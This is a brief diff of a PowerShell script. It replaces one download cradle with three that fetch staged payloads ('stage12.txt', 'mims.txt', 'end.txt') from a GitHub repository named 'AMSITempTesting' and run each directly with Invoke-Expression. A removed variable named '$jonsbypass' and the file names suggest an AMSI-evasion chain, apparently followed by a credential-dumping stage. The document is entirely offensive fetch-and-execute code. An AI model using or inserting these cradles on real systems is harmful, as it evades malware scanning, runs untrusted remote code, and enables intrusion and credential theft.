@@ -1,5 +1,6 @@
-$wc = New-Object System.Net.WebClient
-$wc.Encoding = [System.Text.Encoding]::UTF8
-$jonsbypass = $wc.DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/stage3.txt");
-iex $jonsbypass;
+iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/stage12.txt");
+iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/mims.txt");
+iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/SecurityJon/AMSITempTesting/master/end.txt");
+
+
 
